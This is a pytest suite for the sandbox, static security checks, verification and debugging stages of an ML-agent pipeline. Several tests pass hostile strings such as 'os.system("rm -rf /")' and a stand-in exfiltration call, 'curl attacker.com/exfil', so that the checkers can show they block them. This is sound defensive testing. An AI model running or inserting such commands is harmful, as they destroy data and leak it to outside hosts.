"""Stage 10 tests: Security + Verification + Sandbox.

Test coverage:
- TestDockerSandbox: Docker sandbox init, fallback, mock client, blocked code
- TestSASTCheck: regex patterns, AST patterns, hallucinated imports, combined, pass cases
- TestSemanticVerify: enhanced prompt, structured output, mock pass, real feedback
- TestHumanInTheLoop: interrupt_before, resume_with_update, approve exception
- TestErrorClassification: regex patterns, LLM fallback, edge cases
- TestReflectionDebug: error_class in debug functions, targeted fixes
- TestStage10Integration: full refinement step with real A_sast, real A_verify
- TestStage10Regression: imports from new locations work
"""

import os
import pytest
import tempfile
from unittest.mock import patch, MagicMock


# ── Docker Sandbox Tests ─────────────────────────────────────────────────


class TestDockerSandbox:
    """Tests for DockerSandbox class and _execute_in_docker."""

    def test_s10_01_docker_sandbox_init(self):
        """DockerSandbox can be instantiated with defaults."""
        from src.mle_star.nodes.execution import DockerSandbox

        sandbox = DockerSandbox(work_dir="/tmp/test_sandbox")
        assert sandbox.image is not None
        assert sandbox.cpu_limit > 0
        assert sandbox.memory_limit_mb > 0

    def test_s10_02_docker_sandbox_custom_config(self):
        """DockerSandbox respects custom image and limits."""
        from src.mle_star.nodes.execution import DockerSandbox

        sandbox = DockerSandbox(
            work_dir="/tmp/test_sandbox",
            image="python:3.11-slim",
            cpu_limit=2,
            memory_limit_mb=8192,
        )
        assert sandbox.image == "python:3.11-slim"
        assert sandbox.cpu_limit == 2
        assert sandbox.memory_limit_mb == 8192

    def test_s10_03_docker_sandbox_context_manager(self):
        """DockerSandbox works as context manager."""
        from src.mle_star.nodes.execution import DockerSandbox

        with DockerSandbox(work_dir="/tmp/test_sandbox") as sandbox:
            assert sandbox is not None

    def test_s10_04_docker_available_returns_false(self):
        """_docker_available returns False when Docker not installed."""
        from src.mle_star.nodes.execution import _docker_available

        with patch.dict("sys.modules", {"docker": None}):
            assert _docker_available() is False

    def test_s10_05_docker_available_returns_true_with_mock(self):
        """_docker_available returns True with mocked Docker client."""
        from src.mle_star.nodes.execution import _docker_available

        mock_docker = MagicMock()
        mock_client = MagicMock()
        mock_client.ping.return_value = True
        mock_docker.from_env.return_value = mock_client
        with patch.dict("sys.modules", {"docker": mock_docker}):
            result = _docker_available()
            assert result is True

    def test_s10_06_execute_code_use_docker_false_uses_subprocess(self):
        """execute_code with use_docker=False uses subprocess path."""
        from src.mle_star.nodes.execution import execute_code

        result = execute_code(
            "import sklearn; print('Final Validation Performance: 0.5')",
            use_docker=False,
        )
        assert result["status"] in ("ok", "error", "blocked")

    def test_s10_07_execute_code_blocked_by_safety(self):
        """Malicious code is blocked regardless of use_docker setting."""
        from src.mle_star.nodes.execution import execute_code

        result = execute_code('os.system("rm -rf /")', use_docker=False)
        assert result["status"] == "blocked"

    def test_s10_08_docker_sandbox_run_with_mock_client(self):
        """DockerSandbox.run works with mocked Docker client."""
        from src.mle_star.nodes.execution import DockerSandbox

        mock_container = MagicMock()
        mock_container.wait.return_value = {"StatusCode": 0}
        mock_container.logs.side_effect = [
            b"Final Validation Performance: 0.85\n",
            b"",
        ]
        mock_container.remove = MagicMock()

        mock_client = MagicMock()
        mock_client.containers.run.return_value = mock_container
        mock_client.ping.return_value = True

        mock_docker = MagicMock()
        mock_docker.from_env.return_value = mock_client
        mock_docker.errors.ImageNotFound = type("ImageNotFound", (Exception,), {})

        with tempfile.TemporaryDirectory() as tmpdir:
            sandbox = DockerSandbox(work_dir=tmpdir)
            with patch.dict("sys.modules", {"docker": mock_docker}):
                sandbox._client = mock_client
                result = sandbox.run("print(1)", timeout=30)
        assert result["status"] == "ok"
        assert result["score"] == 0.85

    def test_s10_09_docker_sandbox_network_disabled(self):
        """DockerSandbox passes network_mode='none' to container."""
        from src.mle_star.nodes.execution import DockerSandbox

        mock_container = MagicMock()
        mock_container.wait.return_value = {"StatusCode": 0}
        mock_container.logs.side_effect = [b"Final Validation Performance: 0.5\n", b""]
        mock_container.remove = MagicMock()

        mock_client = MagicMock()
        mock_client.containers.run.return_value = mock_container

        mock_docker = MagicMock()
        mock_docker.from_env.return_value = mock_client
        mock_docker.errors.ImageNotFound = type("ImageNotFound", (Exception,), {})

        with tempfile.TemporaryDirectory() as tmpdir:
            sandbox = DockerSandbox(work_dir=tmpdir)
            with patch.dict("sys.modules", {"docker": mock_docker}):
                sandbox._client = mock_client
                sandbox.run("print(1)", timeout=30)

        call_kwargs = mock_client.containers.run.call_args[1]
        assert call_kwargs["network_mode"] == "none"

    def test_s10_10_docker_sandbox_resource_limits(self):
        """DockerSandbox passes CPU and memory limits to container."""
        from src.mle_star.nodes.execution import DockerSandbox

        mock_container = MagicMock()
        mock_container.wait.return_value = {"StatusCode": 0}
        mock_container.logs.side_effect = [b"Final Validation Performance: 0.5\n", b""]
        mock_container.remove = MagicMock()

        mock_client = MagicMock()
        mock_client.containers.run.return_value = mock_container

        mock_docker = MagicMock()
        mock_docker.from_env.return_value = mock_client
        mock_docker.errors.ImageNotFound = type("ImageNotFound", (Exception,), {})

        with tempfile.TemporaryDirectory() as tmpdir:
            sandbox = DockerSandbox(
                work_dir=tmpdir,
                cpu_limit=2,
                memory_limit_mb=8192,
            )
            with patch.dict("sys.modules", {"docker": mock_docker}):
                sandbox._client = mock_client
                sandbox.run("print(1)", timeout=30)

        call_kwargs = mock_client.containers.run.call_args[1]
        assert call_kwargs["mem_limit"] == "8192m"
        assert call_kwargs["nano_cpus"] == int(2 * 1e9)


# ── SAST Check Tests ─────────────────────────────────────────────────────


class TestSASTCheck:
    """Tests for SAST verification (A_sast real implementation)."""

    def test_s10_11_regex_os_system_blocked(self):
        """os.system call is detected by regex SAST."""
        from src.mle_star.nodes.verification import _regex_sast_check

        violations = _regex_sast_check('os.system("rm -rf /")')
        assert len(violations) > 0
        assert any("os.system" in v["description"] for v in violations)

    def test_s10_12_regex_shell_true_blocked(self):
        """subprocess with shell=True is detected by regex SAST."""
        from src.mle_star.nodes.verification import _regex_sast_check

        violations = _regex_sast_check('subprocess.call("ls", shell=True)')
        assert len(violations) > 0
        assert any("shell" in v["description"].lower() for v in violations)

    def test_s10_13_regex_eval_blocked(self):
        """eval() call is detected by regex SAST."""
        from src.mle_star.nodes.verification import _regex_sast_check

        violations = _regex_sast_check("eval(user_input)")
        assert len(violations) > 0
        assert any("eval" in v["description"] for v in violations)

    def test_s10_14_regex_pickle_blocked(self):
        """pickle.loads/load is detected by regex SAST."""
        from src.mle_star.nodes.verification import _regex_sast_check

        violations = _regex_sast_check("pickle.loads(data)")
        assert len(violations) > 0
        assert any("pickle" in v["description"] for v in violations)

    def test_s10_15_regex_clean_code_passes(self):
        """Clean sklearn code passes regex SAST."""
        from src.mle_star.nodes.verification import _regex_sast_check

        code = """
import sklearn
from sklearn.ensemble import RandomForestRegressor
model = RandomForestRegressor()
model.fit(X_train, y_train)
"""
        violations = _regex_sast_check(code)
        critical = [v for v in violations if v.get("severity") == "critical"]
        assert len(critical) == 0

    def test_s10_16_ast_forbidden_import_blocked(self):
        """Forbidden imports (subprocess) are detected by AST SAST."""
        from src.mle_star.nodes.verification import _ast_sast_check

        violations = _ast_sast_check("import subprocess")
        assert len(violations) > 0
        assert any("subprocess" in v["description"] for v in violations)

    def test_s10_17_ast_eval_blocked(self):
        """eval() call is detected by AST SAST."""
        from src.mle_star.nodes.verification import _ast_sast_check

        violations = _ast_sast_check('eval("1+1")')
        assert len(violations) > 0
        assert any("eval" in v["description"] for v in violations)

    def test_s10_18_ast_pickle_blocked(self):
        """pickle.loads() is detected by AST SAST."""
        from src.mle_star.nodes.verification import _ast_sast_check

        violations = _ast_sast_check("import pickle\npickle.loads(data)")
        assert len(violations) > 0

    def test_s10_19_ast_shell_true_blocked(self):
        """subprocess with shell=True is detected by AST SAST."""
        from src.mle_star.nodes.verification import _ast_sast_check

        violations = _ast_sast_check(
            "import subprocess\nsubprocess.run(['ls'], shell=True)"
        )
        assert len(violations) > 0
        assert any("shell" in v["description"].lower() for v in violations)

    def test_s10_20_ast_clean_code_passes(self):
        """Clean sklearn code passes AST SAST."""
        from src.mle_star.nodes.verification import _ast_sast_check

        code = """
from sklearn.ensemble import RandomForestRegressor
model = RandomForestRegressor()
model.fit(X, y)
"""
        violations = _ast_sast_check(code)
        assert len(violations) == 0

    def test_s10_21_ast_syntax_error_returns_empty(self):
        """AST SAST returns empty list for syntax errors."""
        from src.mle_star.nodes.verification import _ast_sast_check

        violations = _ast_sast_check("def foo(")
        assert len(violations) == 0

    def test_s10_22_hallucinated_import_blocked(self):
        """Non-existent package import is detected."""
        from src.mle_star.nodes.verification import _check_hallucinated_imports

        violations = _check_hallucinated_imports("import fakepkg_xyz_12345")
        assert len(violations) > 0
        assert any("hallucinated" in v["type"] for v in violations)

    def test_s10_23_known_package_not_flagged(self):
        """Known ML packages are not flagged as hallucinated."""
        from src.mle_star.nodes.verification import _check_hallucinated_imports

        violations = _check_hallucinated_imports("import sklearn\nimport pandas")
        assert len(violations) == 0

    def test_s10_24_a_sast_mock_passes(self):
        """A_sast in mock mode always passes."""
        from src.mle_star.nodes.verification import A_sast

        result = A_sast({"refined_code": "os.system('rm -rf /')"})
        assert result["status"] == "pass"

    def test_s10_25_a_sast_real_blocks_critical(self):
        """A_sast in real mode blocks code with critical violations."""
        from src.mle_star.nodes.verification import A_sast

        with patch("src.mle_star.nodes.verification._is_mock_mode", return_value=False):
            result = A_sast(
                {"refined_code": "os.system('rm -rf /')", "candidate_solution": ""}
            )
            assert result["status"] == "critical_violation"
            assert len(result.get("violations", [])) > 0

    def test_s10_26_a_sast_real_passes_clean_code(self):
        """A_sast in real mode passes clean sklearn code."""
        from src.mle_star.nodes.verification import A_sast

        code = "from sklearn.ensemble import RandomForestRegressor\nmodel = RandomForestRegressor()"
        with patch("src.mle_star.nodes.verification._is_mock_mode", return_value=False):
            result = A_sast({"refined_code": code, "candidate_solution": code})
            assert result["status"] == "pass"

    def test_s10_27_a_sast_real_warns_on_non_critical(self):
        """A_sast in real mode warns on non-critical issues."""
        from src.mle_star.nodes.verification import A_sast

        code = "compile('1+1', '<string>', 'eval')"
        with patch("src.mle_star.nodes.verification._is_mock_mode", return_value=False):
            result = A_sast({"refined_code": code, "candidate_solution": code})
            assert result["status"] in ("pass", "critical_violation")

    def test_s10_28_a_sast_empty_code_passes(self):
        """A_sast passes when code is empty."""
        from src.mle_star.nodes.verification import A_sast

        with patch("src.mle_star.nodes.verification._is_mock_mode", return_value=False):
            result = A_sast({"refined_code": "", "candidate_solution": ""})
            assert result["status"] == "pass"

    def test_s10_29_a_sast_combined_checks(self):
        """A_sast combines regex + AST + hallucinated imports."""
        from src.mle_star.nodes.verification import (
            _regex_sast_check,
            _ast_sast_check,
            _check_hallucinated_imports,
        )

        code = "import subprocess\nimport fakepkg_xyz_999\nos.system('ls')"
        regex_v = _regex_sast_check(code)
        ast_v = _ast_sast_check(code)
        hall_v = _check_hallucinated_imports(code)
        total = len(regex_v) + len(ast_v) + len(hall_v)
        assert total >= 2

    def test_s10_30_deduplicate_violations(self):
        """Duplicate violations are deduplicated."""
        from src.mle_star.nodes.verification import _deduplicate_violations

        violations = [
            {"description": "Forbidden import: subprocess", "line": 1},
            {"description": "Forbidden import: subprocess", "line": 1},
        ]
        deduped = _deduplicate_violations(violations)
        assert len(deduped) == 1

    def test_s10_31_build_violation_report(self):
        """_build_violation_report produces readable report."""
        from src.mle_star.nodes.verification import _build_violation_report

        violations = [
            {"severity": "critical", "description": "os.system call", "line": 5},
        ]
        report = _build_violation_report(violations)
        assert "CRITICAL" in report
        assert "os.system" in report


# ── Semantic Verify Tests ────────────────────────────────────────────────


class TestSemanticVerify:
    """Tests for enhanced A_verify (Stage 10)."""

    def test_s10_32_a_verify_mock_passes(self):
        """A_verify in mock mode always passes."""
        from src.mle_star.nodes.verification import A_verify

        result = A_verify({"refined_code": "some code"})
        assert result["status"] == "ok"

    def test_s10_33_a_verify_moved_to_verification_py(self):
        """A_verify is importable from nodes/verification.py."""
        from src.mle_star.nodes.verification import A_verify

        assert callable(A_verify)

    def test_s10_34_a_sast_moved_to_verification_py(self):
        """A_sast is importable from nodes/verification.py."""
        from src.mle_star.nodes.verification import A_sast

        assert callable(A_sast)

    def test_s10_35_a_verify_refinement_imports_from_verification(self):
        """refinement.py imports A_verify from verification.py."""
        from src.mle_star.nodes.refinement import A_verify
        from src.mle_star.nodes.verification import A_verify as V_A_verify

        assert A_verify is V_A_verify

    def test_s10_36_a_sast_refinement_imports_from_verification(self):
        """refinement.py imports A_sast from verification.py."""
        from src.mle_star.nodes.refinement import A_sast
        from src.mle_star.nodes.verification import A_sast as V_A_sast

        assert A_sast is V_A_sast

    def test_s10_37_semantic_verify_prompt_has_checks(self):
        """SEMANTIC_VERIFY_PROMPT includes all 7 checks."""
        from src.mle_star.prompts.verification import SEMANTIC_VERIFY_PROMPT

        assert "task_alignment" in SEMANTIC_VERIFY_PROMPT
        assert "target_variable" in SEMANTIC_VERIFY_PROMPT
        assert "metric_computation" in SEMANTIC_VERIFY_PROMPT
        assert "data_splitting" in SEMANTIC_VERIFY_PROMPT
        assert "interface_compatibility" in SEMANTIC_VERIFY_PROMPT
        assert "data_sources" in SEMANTIC_VERIFY_PROMPT
        assert "logical_correctness" in SEMANTIC_VERIFY_PROMPT

    def test_s10_38_sast_prompt_exists(self):
        """SAST_CHECK_PROMPT is defined."""
        from src.mle_star.prompts.verification import SAST_CHECK_PROMPT

        assert len(SAST_CHECK_PROMPT) > 0
        assert "command_injection" in SAST_CHECK_PROMPT


# ── Human-in-the-Loop Tests ──────────────────────────────────────────────


class TestHumanInTheLoop:
    """Tests for human-in-the-loop support (Stage 10)."""

    def test_s10_39_supervisor_config_interrupt_points(self):
        """SupervisorConfig has interrupt_points field."""
        from src.mle_star.supervisor import SupervisorConfig

        config = SupervisorConfig(interrupt_points=["supervisor"])
        assert config.interrupt_points == ["supervisor"]

    def test_s10_40_supervisor_config_default_interrupt_points(self):
        """SupervisorConfig default interrupt_points is empty list."""
        from src.mle_star.supervisor import SupervisorConfig

        config = SupervisorConfig()
        assert config.interrupt_points == []

    def test_s10_41_graph_compiles_with_interrupt_before(self):
        """get_mle_star_graph compiles with interrupt_before."""
        from src.mle_star.graph import get_mle_star_graph
        from src.mle_star.supervisor import SupervisorConfig
        from src.mle_star.state.shared import get_checkpointer

        config = SupervisorConfig(interrupt_points=["supervisor"])
        checkpointer = get_checkpointer("/tmp/test_s10_41")
        graph = get_mle_star_graph(config, checkpointer=checkpointer)
        assert graph is not None

    def test_s10_42_resume_with_update_exists(self):
        """resume_with_update function exists in graph module."""
        from src.mle_star.graph import resume_with_update

        assert callable(resume_with_update)

    def test_s10_43_approve_security_exception_exists(self):
        """approve_security_exception function exists."""
        from src.mle_star.nodes.verification import approve_security_exception

        assert callable(approve_security_exception)

    def test_s10_44_approve_security_exception_approves(self):
        """approve_security_exception approves and clears critical_violation."""
        from src.mle_star.nodes.verification import approve_security_exception

        state = {
            "status": "critical_violation",
            "violations": [{"description": "os.system call", "severity": "critical"}],
        }
        result = approve_security_exception(state)
        assert result["status"] == "pass"
        assert result.get("security_exceptions_approved") is True

    def test_s10_45_approve_security_exception_no_violation(self):
        """approve_security_exception on non-violation state returns pass."""
        from src.mle_star.nodes.verification import approve_security_exception

        state = {"status": "pass"}
        result = approve_security_exception(state)
        assert result["status"] == "pass"

    def test_s10_46_approve_specific_violation(self):
        """approve_security_exception can approve a specific violation by index."""
        from src.mle_star.nodes.verification import approve_security_exception

        state = {
            "status": "critical_violation",
            "violations": [
                {"description": "os.system call", "severity": "critical"},
                {"description": "eval() call", "severity": "critical"},
            ],
        }
        result = approve_security_exception(state, violation_index=0)
        assert result["status"] == "pass"
        assert len(result.get("security_violations", [])) == 1


# ── Error Classification Tests ──────────────────────────────────────────


class TestErrorClassification:
    """Tests for reflection-based debugging error classifier."""

    def test_s10_47_classify_shape_mismatch(self):
        """_classify_error classifies shape mismatch errors."""
        from src.mle_star.nodes.robustness import _classify_error

        result = _classify_error("ValueError: shapes (3,) and (5,) not aligned")
        assert result["error_type"] == "ShapeMismatch"

    def test_s10_48_classify_import_error(self):
        """_classify_error classifies import errors."""
        from src.mle_star.nodes.robustness import _classify_error

        result = _classify_error("ModuleNotFoundError: No module named 'fakepkg'")
        assert result["error_type"] == "ImportError"

    def test_s10_49_classify_key_error(self):
        """_classify_error classifies key errors."""
        from src.mle_star.nodes.robustness import _classify_error

        result = _classify_error("KeyError: 'target'")
        assert result["error_type"] == "KeyError"

    def test_s10_50_classify_value_error(self):
        """_classify_error classifies value errors."""
        from src.mle_star.nodes.robustness import _classify_error

        result = _classify_error("ValueError: Input contains NaN")
        assert result["error_type"] == "ValueError"

    def test_s10_51_classify_type_error(self):
        """_classify_error classifies type errors."""
        from src.mle_star.nodes.robustness import _classify_error

        result = _classify_error("TypeError: unsupported operand type(s)")
        assert result["error_type"] == "TypeError"

    def test_s10_52_classify_attribute_error(self):
        """_classify_error classifies attribute errors."""
        from src.mle_star.nodes.robustness import _classify_error

        result = _classify_error(
            "AttributeError: 'DataFrame' object has no attribute 'predict'"
        )
        assert result["error_type"] == "AttributeError"

    def test_s10_53_classify_index_error(self):
        """_classify_error classifies index errors."""
        from src.mle_star.nodes.robustness import _classify_error

        result = _classify_error("IndexError: index out of range")
        assert result["error_type"] == "IndexError"

    def test_s10_54_classify_timeout(self):
        """_classify_error classifies timeout errors."""
        from src.mle_star.nodes.robustness import _classify_error

        result = _classify_error(
            "TimeoutExpired: Execution timed out after 600 seconds"
        )
        assert result["error_type"] == "Timeout"

    def test_s10_55_classify_data_leakage(self):
        """_classify_error classifies data leakage errors."""
        from src.mle_star.nodes.robustness import _classify_error

        result = _classify_error("DataLeakage: train test contamination detected")
        assert result["error_type"] == "DataLeakage"

    def test_s10_56_classify_unknown_as_other(self):
        """_classify_error returns 'Other' for unrecognized errors."""
        from src.mle_star.nodes.robustness import _classify_error

        result = _classify_error("Something completely unexpected happened")
        assert result["error_type"] == "Other"
        assert result["confidence"] == "low"

    def test_s10_57_classify_returns_suggestion(self):
        """_classify_error returns a suggestion for known error types."""
        from src.mle_star.nodes.robustness import _classify_error

        result = _classify_error("ValueError: Input contains NaN")
        assert len(result["suggestion"]) > 0

    def test_s10_58_classify_reads_stderr(self):
        """_classify_error combines error_msg and stderr for classification."""
        from src.mle_star.nodes.robustness import _classify_error

        result = _classify_error(
            "unknown error",
            stderr="ValueError: shapes (3,) and (5,) not aligned",
        )
        assert result["error_type"] == "ShapeMismatch"

    def test_s10_59_classify_high_confidence_types(self):
        """High-confident types return high confidence."""
        from src.mle_star.nodes.robustness import _classify_error

        result = _classify_error("KeyError: 'column_name'")
        assert result["confidence"] == "high"

    def test_s10_60_error_classifier_prompt_exists(self):
        """ERROR_CLASSIFIER_PROMPT is defined."""
        from src.mle_star.prompts.robustness import ERROR_CLASSIFIER_PROMPT

        assert len(ERROR_CLASSIFIER_PROMPT) > 0
        assert "ShapeMismatch" in ERROR_CLASSIFIER_PROMPT


# ── Reflection Debug Integration Tests ──────────────────────────────────


class TestReflectionDebug:
    """Tests for reflection-based debugging integration in A11__debug* functions."""

    def test_s10_61_debug_ensemble_classifies_error(self):
        """A11__debug_ensemble classifies error type in mock mode."""
        from src.mle_star.nodes.robustness import A11__debug_ensemble

        state = {
            "execution_error": "ValueError: Input contains NaN",
            "current_ensemble_code": "import sklearn\n",
            "debug_retries": 0,
        }
        result = A11__debug_ensemble(state)
        assert result["status"] == "debugged"
        assert result["debug_retries"] == 1

    def test_s10_62_debug_refine_classifies_error(self):
        """A11__debug_refine classifies error type in mock mode."""
        from src.mle_star.nodes.refinement import A11__debug_refine

        state = {
            "execution_error": "KeyError: 'target'",
            "refined_code": "some code",
            "current_solution": "full solution",
            "target_block": "block",
            "debug_retries": 0,
        }
        result = A11__debug_refine(state)
        assert result["status"] == "debugged"
        assert result["debug_retries"] == 1

    def test_s10_63_debug_ensemble_error_type_in_log(self):
        """A11__debug_ensemble logs error_type alongside other info."""
        from src.mle_star.nodes.robustness import A11__debug_ensemble

        state = {
            "execution_error": "TimeoutExpired: timed out",
            "current_ensemble_code": "code",
            "debug_retries": 0,
        }
        result = A11__debug_ensemble(state)
        assert result["status"] == "debugged"


# ── Integration Tests ────────────────────────────────────────────────────


class TestStage10Integration:
    """Integration tests for Stage 10 components working together."""

    def test_s10_64_sast_passes_refinement_subgraph(self):
        """A_sast pass status routes to eval_refinement correctly."""
        from src.mle_star.nodes.refinement import route_after_sast

        assert route_after_sast({"status": "pass"}) == "eval_refinement"

    def test_s10_65_sast_critical_routes_to_a7(self):
        """A_sast critical_violation routes to A7__implement."""
        from src.mle_star.nodes.refinement import route_after_sast

        assert route_after_sast({"status": "critical_violation"}) == "A7__implement"

    def test_s10_66_verify_pass_routes_to_sast(self):
        """A_verify ok routes to A_sast."""
        from src.mle_star.nodes.refinement import route_after_verify

        assert route_after_verify({"status": "ok"}) == "A_sast"

    def test_s10_67_verify_fail_routes_to_a7(self):
        """A_verify semantic_fail routes to A7__implement."""
        from src.mle_star.nodes.refinement import route_after_verify

        assert route_after_verify({"status": "semantic_fail"}) == "A7__implement"

    def test_s10_68_sast_blocks_before_execution(self):
        """Code with os.system is blocked by A_sast before execution."""
        from src.mle_star.nodes.verification import A_sast

        malicious_code = """
import os
from sklearn.ensemble import RandomForestRegressor
os.system("curl attacker.com/exfil")
model = RandomForestRegressor()
"""
        with patch("src.mle_star.nodes.verification._is_mock_mode", return_value=False):
            result = A_sast(
                {"refined_code": malicious_code, "candidate_solution": malicious_code}
            )
            assert result["status"] == "critical_violation"

    def test_s10_69_config_new_variables(self):
        """New config variables exist and have expected defaults."""
        from src.mle_star.config import (
            MAX_LLM_CALLS_PER_PHASE,
            PER_NODE_TIMEOUT_SECONDS,
            DOCKER_SANDBOX_ENABLED,
            DOCKER_IMAGE,
            DOCKER_CPU_LIMIT,
            DOCKER_MEMORY_LIMIT_MB,
        )

        assert MAX_LLM_CALLS_PER_PHASE > 0
        assert PER_NODE_TIMEOUT_SECONDS > 0
        assert isinstance(DOCKER_SANDBOX_ENABLED, bool)
        assert DOCKER_IMAGE  # non-empty image name
        assert DOCKER_CPU_LIMIT > 0
        assert DOCKER_MEMORY_LIMIT_MB > 0

    def test_s10_70_hallucinated_import_test(self):
        """A_sast detects hallucinated imports for unknown packages."""
        from src.mle_star.nodes.verification import A_sast

        code = "import totally_fake_package_xyz_123\n"
        with patch("src.mle_star.nodes.verification._is_mock_mode", return_value=False):
            result = A_sast({"refined_code": code, "candidate_solution": code})
            assert result["status"] == "critical_violation"
            violations = result.get("violations", [])
            assert any("hallucinated" in v.get("type", "") for v in violations)

    def test_s10_71_refinement_step_subgraph_uses_verification_nodes(self):
        """Refinement step subgraph imports A_verify and A_sast from verification."""
        from src.mle_star.subgraphs.refinement_subgraph import (
            get_refinement_step_subgraph,
        )

        subgraph = get_refinement_step_subgraph()
        assert subgraph is not None

    def test_s10_72_classify_error_in_mock_debug(self):
        """_classify_error works in mock mode debug without LLM call."""
        from src.mle_star.nodes.robustness import _classify_error

        with patch("src.mle_star.nodes.robustness._is_mock_mode", return_value=True):
            result = _classify_error("ModuleNotFoundError: No module named 'xgboost'")
            assert result["error_type"] == "ImportError"


# ── Regression Tests ─────────────────────────────────────────────────────


class TestStage10Regression:
    """Regression tests: verify nothing from previous stages broke."""

    def test_s10_73_a_verify_backward_compat(self):
        """A_verify still returns {status: 'ok'} in mock mode (backward compat)."""
        from src.mle_star.nodes.verification import A_verify

        result = A_verify({"refined_code": "code"})
        assert result["status"] == "ok"

    def test_s10_74_a_sast_backward_compat(self):
        """A_sast still returns {status: 'pass'} in mock mode (backward compat)."""
        from src.mle_star.nodes.verification import A_sast

        result = A_sast({"refined_code": "code"})
        assert result["status"] == "pass"

    def test_s10_75_route_after_verify_backward_compat(self):
        """route_after_verify still works correctly."""
        from src.mle_star.nodes.refinement import route_after_verify

        assert route_after_verify({"status": "ok"}) == "A_sast"
        assert route_after_verify({"status": "semantic_fail"}) == "A7__implement"

    def test_s10_76_route_after_sast_backward_compat(self):
        """route_after_sast still works correctly."""
        from src.mle_star.nodes.refinement import route_after_sast

        assert route_after_sast({"status": "pass"}) == "eval_refinement"
        assert route_after_sast({"status": "critical_violation"}) == "A7__implement"


# ── Stage 10 Gap Fix Tests ────────────────────────────────────────────────


class TestStage10GapFixes:
    """Tests for Stage 10 gap fixes: safety check, report key, LLM counter, timeout, interrupts."""

    def test_s10_77_execute_code_docker_path_blocks_malicious(self):
        """execute_code blocks malicious code even with use_docker=True (safety check before Docker)."""
        from src.mle_star.nodes.execution import execute_code

        with patch("src.mle_star.nodes.execution._docker_available", return_value=True):
            result = execute_code('os.system("rm -rf /")', use_docker=True)
        assert result["status"] == "blocked"

    def test_s10_78_a_sast_returns_report_on_pass(self):
        """A_sast returns 'report' key on clean pass."""
        from src.mle_star.nodes.verification import A_sast

        code = "from sklearn.ensemble import RandomForestRegressor\nmodel = RandomForestRegressor()"
        with patch("src.mle_star.nodes.verification._is_mock_mode", return_value=False):
            result = A_sast({"refined_code": code, "candidate_solution": code})
        assert "report" in result
        assert result["status"] == "pass"

    def test_s10_79_a_sast_mock_returns_report(self):
        """A_sast in mock mode returns 'report' key."""
        from src.mle_star.nodes.verification import A_sast

        result = A_sast({"refined_code": "code"})
        assert "report" in result

    def test_s10_80_a_sast_empty_code_returns_report(self):
        """A_sast with empty code returns 'report' key."""
        from src.mle_star.nodes.verification import A_sast

        with patch("src.mle_star.nodes.verification._is_mock_mode", return_value=False):
            result = A_sast({"refined_code": "", "candidate_solution": ""})
        assert "report" in result

    def test_s10_81_a_verify_returns_report_on_ok(self):
        """A_verify in mock mode returns 'report' key on ok."""
        from src.mle_star.nodes.verification import A_verify

        result = A_verify({"refined_code": "code"})
        assert result["status"] == "ok"
        assert "report" in result

    def test_s10_82_llm_call_counter_increment(self):
        """call_llm increments the LLM call counter."""
        from src.mle_star.state.shared import get_llm_call_count, reset_llm_call_counter

        reset_llm_call_counter()
        assert get_llm_call_count() == 0

    def test_s10_83_llm_call_counter_enforces_limit(self):
        """_increment_and_check_llm_limit raises RuntimeError when limit exceeded."""
        from src.mle_star.state.shared import (
            reset_llm_call_counter,
            _increment_and_check_llm_limit,
        )

        reset_llm_call_counter()
        with patch("src.mle_star.config.MAX_LLM_CALLS_PER_PHASE", 1):
            _increment_and_check_llm_limit()
            with pytest.raises(RuntimeError, match="LLM call limit exceeded"):
                _increment_and_check_llm_limit()

    def test_s10_84_llm_call_counter_reset(self):
        """reset_llm_call_counter resets the count to zero."""
        from src.mle_star.state.shared import reset_llm_call_counter, get_llm_call_count

        reset_llm_call_counter()
        assert get_llm_call_count() == 0

    def test_s10_85_run_with_timeout_completes(self):
        """run_with_timeout completes when function finishes within timeout."""
        from src.mle_star.state.shared import run_with_timeout

        result = run_with_timeout(lambda: 42, timeout_seconds=10)
        assert result == 42

    def test_s10_86_run_with_timeout_raises_on_exceed(self):
        """run_with_timeout raises TimeoutError when function exceeds timeout."""
        import time
        from src.mle_star.state.shared import run_with_timeout

        with pytest.raises(TimeoutError):
            run_with_timeout(lambda: time.sleep(5), timeout_seconds=1)

    def test_s10_87_docker_image_default(self):
        """DOCKER_IMAGE defaults to od_runtime."""
        from src.mle_star.config import DOCKER_IMAGE

        assert "od_runtime" in DOCKER_IMAGE or "python" in DOCKER_IMAGE

    def test_s10_88_refinement_subgraph_accepts_interrupt_before(self):
        """get_refinement_step_subgraph accepts interrupt_before parameter."""
        from src.mle_star.subgraphs.refinement_subgraph import (
            get_refinement_step_subgraph,
        )

        subgraph = get_refinement_step_subgraph(interrupt_before=["A_sast"])
        assert subgraph is not None

    def test_s10_89_submission_subgraph_accepts_interrupt_before(self):
        """get_submission_subgraph accepts interrupt_before parameter."""
        from src.mle_star.subgraphs.submission_subgraph import get_submission_subgraph

        subgraph = get_submission_subgraph(interrupt_before=["eval_submission"])
        assert subgraph is not None

    def test_s10_90_refinement_subgraph_backward_compat(self):
        """get_refinement_step_subgraph works without interrupt_before (backward compat)."""
        from src.mle_star.subgraphs.refinement_subgraph import (
            get_refinement_step_subgraph,
        )

        subgraph = get_refinement_step_subgraph()
        assert subgraph is not None

    def test_s10_91_submission_subgraph_backward_compat(self):
        """get_submission_subgraph works without interrupt_before (backward compat)."""
        from src.mle_star.subgraphs.submission_subgraph import get_submission_subgraph

        subgraph = get_submission_subgraph()
        assert subgraph is not None
